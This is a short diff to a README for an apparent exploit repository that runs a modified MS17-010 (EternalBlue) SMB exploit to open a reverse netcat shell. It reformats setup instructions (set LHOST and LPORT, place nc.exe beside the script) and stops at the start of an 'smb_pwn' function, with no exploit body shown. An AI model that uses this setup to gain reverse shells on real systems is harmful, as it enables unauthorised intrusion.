@@ -1,10 +1,10 @@
 # MS-17-010_Reverse_Connection_nc
 #### Run MS17-010 modified exploit to get reverse nc connection
 
-Modified Code
-Change LHOST and LPORT. This is your IP address and port where you are listening.
-nc.exe is in same folder where your script.
+##### Change LHOST and LPORT. This is your IP address and port where you are listening.
+##### nc.exe is in same folder where you saved the script.
 
+####Modified Code
 ---------------------------------------------------------------------------------------------------------------------------------------
 
 def smb_pwn(conn, arch):
